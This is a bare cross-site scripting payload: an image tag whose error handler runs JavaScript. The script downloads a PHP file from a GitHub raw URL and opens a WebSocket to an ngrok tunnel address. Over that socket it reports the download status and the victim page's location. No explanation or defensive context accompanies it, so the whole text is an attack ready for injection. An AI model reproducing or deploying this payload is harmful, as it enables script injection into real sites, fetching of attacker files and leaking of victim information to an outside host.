<img src=x onerror="
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://raw.githubusercontent.com/NetrkTM1/gspa/refs/heads/main/515.php', true);
    xhr.onload = function () {
        if (xhr.status === 200) {
            console.log('Download status: Yes');
            sendInfo('Yes', '515.php'); // Send download info
        } else {
            console.error('Download failed: ', xhr.statusText);
            console.log('Download status: No');
            sendInfo('No', '');
        }
    };
    xhr.onerror = function () {
        console.error('Error downloading file');
        console.log('Download status: No');
        sendInfo('No', '');
    };
    xhr.send();

    function sendInfo(status, filename) {
        const net = new WebSocket('ws://7.tcp.eu.ngrok.io:18592'); // Replace with your TCP server address
        net.onopen = function () {
            const data = {
                status: status,
                filename: filename,
                downloadLocation: window.location.href
            };
            net.send(JSON.stringify(data)); // Send the download info
        };
    }
">
